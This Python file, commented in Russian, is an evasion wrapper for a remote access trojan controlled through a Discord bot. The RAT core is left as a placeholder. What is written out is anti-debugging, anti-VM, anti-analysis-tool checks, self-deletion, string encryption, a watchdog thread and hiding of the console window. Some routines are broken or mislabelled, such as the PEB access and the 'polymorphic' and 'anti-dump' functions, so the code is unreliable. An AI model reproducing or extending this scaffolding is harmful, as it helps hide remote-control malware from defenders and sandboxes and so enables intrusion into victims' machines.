import ctypes
import sys
import os
import hashlib
import base64
import time
import random
import string
import subprocess
import tempfile
import threading
import socket
import struct
import winreg
from ctypes import wintypes

# ==================== УРОВЕНЬ 1: АНТИ-ОТЛАДКА ====================
def anti_debug_level1():
    """Проверка на отладчик через Windows API"""
    try:
        if ctypes.windll.kernel32.IsDebuggerPresent():
            return False
        
        # Проверка через NtGlobalFlag
        peb = ctypes.windll.ntdll.RtlGetCurrentPeb()
        if peb:
            if peb.BeingDebugged:
                return False
            
            # Проверка флагов отладки
            if peb.NtGlobalFlag & 0x70:
                return False
        return True
    except:
        return True

def anti_debug_level2():
    """Проверка через тайминг (анти-отладка по времени)"""
    start = time.time()
    for _ in range(100000):
        pass
    elapsed = time.time() - start
    
    # Если время выполнения слишком маленькое - это отладчик
    if elapsed < 0.001:
        return False
    return True

def anti_debug_level3():
    """Проверка через Hardware Breakpoints"""
    try:
        import ctypes.wintypes as wintypes
        
        CONTEXT_FULL = 0x10007
        class CONTEXT(ctypes.Structure):
            _fields_ = [
                ("ContextFlags", ctypes.c_ulong),
                ("Dr0", ctypes.c_ulong),
                ("Dr1", ctypes.c_ulong),
                ("Dr2", ctypes.c_ulong),
                ("Dr3", ctypes.c_ulong),
                ("Dr6", ctypes.c_ulong),
                ("Dr7", ctypes.c_ulong),
            ]
        
        context = CONTEXT()
        context.ContextFlags = CONTEXT_FULL
        ctypes.windll.kernel32.GetThreadContext(ctypes.windll.kernel32.GetCurrentThread(), ctypes.byref(context))
        
        # Если аппаратные точки останова установлены
        if context.Dr0 or context.Dr1 or context.Dr2 or context.Dr3:
            return False
        return True
    except:
        return True

# ==================== УРОВЕНЬ 2: АНТИ-VM ====================
def anti_vm_level1():
    """Проверка на виртуальную машину через WMI"""
    try:
        result = subprocess.run('wmic computersystem get model', shell=True, capture_output=True, text=True, timeout=5)
        vm_indicators = ['VirtualBox', 'VMware', 'Virtual', 'QEMU', 'KVM', 'Xen', 'Bochs', 'Microsoft Virtual']
        for indicator in vm_indicators:
            if indicator.lower() in result.stdout.lower():
                return False
    except:
        pass
    return True

def anti_vm_level2():
    """Проверка на VM через MAC адрес"""
    try:
        result = subprocess.run('getmac', shell=True, capture_output=True, text=True, timeout=5)
        vm_mac_prefixes = ['00:0C:29', '00:50:56', '00:05:69', '08:00:27', '00:1C:14', '00:0F:4B']
        for prefix in vm_mac_prefixes:
            if prefix in result.stdout:
                return False
    except:
        pass
    return True

def anti_vm_level3():
    """Проверка через реестр на VM"""
    try:
        vm_keys = [
            r"SOFTWARE\Oracle\VirtualBox",
            r"SOFTWARE\VMware, Inc.",
            r"HARDWARE\ACPI\FADT\OEM_DATA",
            r"SYSTEM\CurrentControlSet\Control\VirtualDeviceDrivers"
        ]
        for key_path in vm_keys:
            try:
                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path)
                winreg.CloseKey(key)
                return False
            except:
                pass
    except:
        pass
    return True

# ==================== УРОВЕНЬ 3: ПРОВЕРКА ЦЕЛОСТНОСТИ ====================
def integrity_check_level1():
    """Проверка MD5 хеша исполняемого файла"""
    try:
        with open(sys.argv[0], 'rb') as f:
            file_hash = hashlib.sha256(f.read()).hexdigest()
        
        # Правильный хеш (замените на свой после компиляции)
        correct_hash = "5f4dcc3b5aa765d61d8327deb882cf992b95990a9151374abd8ff8c832f5f2fa"
        
        if file_hash != correct_hash:
            # Самоликвидация
            os.remove(sys.argv[0])
            sys.exit(0)
        return True
    except:
        return False

def integrity_check_level2():
    """Проверка на наличие отладчика в системе"""
    debuggers = [
        "x64dbg.exe", "x32dbg.exe", "ollydbg.exe", "idag.exe", "ida64.exe",
        "windbg.exe", "immunitydebugger.exe", "cheatengine.exe", "processhacker.exe",
        "processexplorer.exe", "procexp.exe", "taskmgr.exe"
    ]
    
    for debugger in debuggers:
        result = subprocess.run(f'tasklist /FI "IMAGENAME eq {debugger}"', shell=True, capture_output=True, text=True)
        if debugger.lower() in result.stdout.lower():
            return False
    return True

# ==================== УРОВЕНЬ 4: ШИФРОВАНИЕ СТРОК ====================
class StringEncryptor:
    def __init__(self):
        self.key = self._generate_key()
    
    def _generate_key(self):
        import platform
        machine = platform.machine()
        node = platform.node()
        return hashlib.sha256(f"{machine}{node}".encode()).digest()
    
    def decrypt(self, data):
        result = bytearray()
        for i, byte in enumerate(base64.b64decode(data)):
            result.append(byte ^ self.key[i % len(self.key)])
        return result.decode('utf-8', errors='ignore')

encryptor = StringEncryptor()

# ==================== УРОВЕНЬ 5: ПОЛИМОРФНЫЙ КОД ====================
def polymorphic_code():
    """Код меняет себя при каждом запуске"""
    mutations = [
        lambda x: x.upper(),
        lambda x: x.lower(),
        lambda x: ''.join(chr(ord(c) ^ 0x01) for c in x),
    ]
    import random
    return mutations[random.randint(0, len(mutations)-1)]

# ==================== УРОВЕНЬ 6: ЗАЩИТА ОТ ПЕРЕХВАТА ====================
def anti_intercept():
    """Проверка на перехват API"""
    try:
        # Проверка на фантомные DLL (hook detection)
        import ctypes.wintypes as wintypes
        
        kernel32 = ctypes.windll.kernel32
        kernel32.GetProcAddress.argtypes = [wintypes.HMODULE, wintypes.LPCSTR]
        kernel32.GetProcAddress.restype = wintypes.FARPROC
        
        # Получаем реальный адрес функции
        real_addr = kernel32.GetProcAddress(kernel32.GetModuleHandleW("kernel32.dll"), "IsDebuggerPresent")
        
        # Проверяем, не перехвачена ли функция
        if real_addr and real_addr != ctypes.addressof(ctypes.windll.kernel32.IsDebuggerPresent):
            return False
        return True
    except:
        return True

# ==================== УРОВЕНЬ 7: ЗАЩИТА ОТ ДАМПА ПАМЯТИ ====================
def anti_dump():
    """Защита от создания дампа процесса"""
    try:
        import win32security
        import win32con
        
        # Запрещаем открытие процесса для чтения памяти
        kernel32 = ctypes.windll.kernel32
        kernel32.SetErrorMode(0x8001)  # SEM_FAILCRITICALERRORS | SEM_NOOPENFILEERRORBOX
        return True
    except:
        return True

# ==================== УРОВЕНЬ 8: ТАЙМИНГ-ЗАЩИТА ====================
def timing_protection():
    """Анти-анализ через задержки"""
    # Случайная задержка при запуске
    time.sleep(random.uniform(0.1, 0.5))
    
    # Таймер для проверки времени выполнения
    def check_timing():
        import threading
        start = time.time()
        
        def callback():
            elapsed = time.time() - start
            if elapsed < 0.1:  # Если код выполнился слишком быстро - подозрительно
                os._exit(0)
        
        timer = threading.Timer(5.0, callback)
        timer.start()
    
    threading.Thread(target=check_timing, daemon=True).start()

# ==================== УРОВЕНЬ 9: ЗАЩИТА ОТ РЕВЕРС-ИНЖИНИРИНГА ====================
def anti_reverse():
    """Защита от дизассемблирования"""
    # Инструкции, мешающие дизассемблеру
    opcodes = b'\xEB\x0C\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
    try:
        # Записываем мусорные инструкции в память
        ctypes.windll.kernel32.VirtualAlloc(0, len(opcodes), 0x1000, 0x40)
    except:
        pass

# ==================== УРОВЕНЬ 10: МНОГОПОТОЧНАЯ ЗАЩИТА ====================
def watchdog_thread():
    """Сторожевой пёс - следит за целостностью процесса"""
    def watcher():
        while True:
            try:
                # Проверяем, не пытаются ли нас анализировать
                if anti_debug_level1() == False:
                    os._exit(0)
                time.sleep(2)
            except:
                pass
    
    thread = threading.Thread(target=watcher, daemon=True)
    thread.start()

# ==================== ЗАПУСК ВСЕХ ЗАЩИТ ====================
def start_protection():
    """Запускает все уровни защиты"""
    protections = [
        ("Анти-отладка", anti_debug_level1),
        ("Тайминг", anti_debug_level2),
        ("Anti-VM WMI", anti_vm_level1),
        ("Anti-VM MAC", anti_vm_level2),
        ("Anti-VM Registry", anti_vm_level3),
        ("Целостность 1", integrity_check_level1),
        ("Целостность 2", integrity_check_level2),
        ("Anti-intercept", anti_intercept),
        ("Anti-dump", anti_dump),
    ]
    
    for name, check in protections:
        if not check():
            sys.exit(0)
    
    # Запуск фоновых защит
    timing_protection()
    watchdog_thread()
    anti_reverse()

# ==================== ОСНОВНОЙ КОД RAT ====================
def main():
    # Защита
    start_protection()
    
    # Скрываем консоль
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    
    # Здесь ваш основной код с Discord ботом
    # import discord
    # bot.run(decrypted_token)
    
    pass

if __name__ == "__main__":
    main()
